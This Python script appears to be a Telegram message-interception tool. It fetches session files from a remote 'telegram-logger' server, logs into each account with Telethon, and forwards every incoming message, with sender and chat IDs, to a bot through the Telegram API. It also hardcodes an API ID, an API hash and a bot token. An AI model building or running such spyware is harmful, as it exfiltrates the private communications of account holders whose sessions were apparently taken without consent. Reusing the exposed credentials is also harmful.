import asyncio
import aiohttp
from telethon import TelegramClient, events
import os

# 🔐 ТВОИ ДАННЫЕ
API_ID = 30074866
API_HASH = "eea91e3c3b0381b36d455383fe5b9989"
BOT_TOKEN = "7649175732:AAEiyZNWIgEdgx3i4f4Bsik_9p9JgEZayS4"

# 🌐 СЕРВЕР (ОБЯЗАТЕЛЬНО https)
SERVER_URL = "https://telegram-logger-production-2ca8.up.railway.app"

# 📁 папка для сессий
SESSIONS_DIR = "sessions"

# создаём папку если нет
os.makedirs(SESSIONS_DIR, exist_ok=True)


# 📥 получаем список сессий с сервера
async def fetch_sessions():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{SERVER_URL}/sessions") as resp:
                data = await resp.json()  # ✅ фикс ошибки string indices

                # поддержка разных форматов
                if isinstance(data, dict):
                    return data.get("sessions", [])
                elif isinstance(data, list):
                    return data
                else:
                    return []

    except Exception as e:
        print("ERR fetch_sessions:", e)
        return []


# 📤 отправка сообщения боту
async def send_to_bot(text):
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={
                    "chat_id": BOT_TOKEN.split(":")[0],  # 👈 отправка самому себе
                    "text": text[:4000]
                }
            )
    except Exception as e:
        print("ERR send_to_bot:", e)


# 🚀 запуск клиента
async def run_client(session_name):
    path = os.path.join(SESSIONS_DIR, session_name)

    client = TelegramClient(path, API_ID, API_HASH)

    @client.on(events.NewMessage)
    async def handler(event):
        try:
            msg = event.message.text or ""

            text = f"""
📩 NEW MESSAGE
👤 ID: {event.sender_id}
💬 Chat: {event.chat_id}

{msg}
"""
            await send_to_bot(text)

        except Exception as e:
            print("ERR handler:", e)

    await client.start()
    print(f"✅ Started: {session_name}")
    await client.run_until_disconnected()


# 🧠 главный цикл
async def main():
    print("🚀 START")

    sessions = await fetch_sessions()
    print("sessions:", sessions)

    if not sessions:
        print("❌ No sessions found")
        return

    tasks = []
    for s in sessions:
        tasks.append(asyncio.create_task(run_client(s)))

    await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
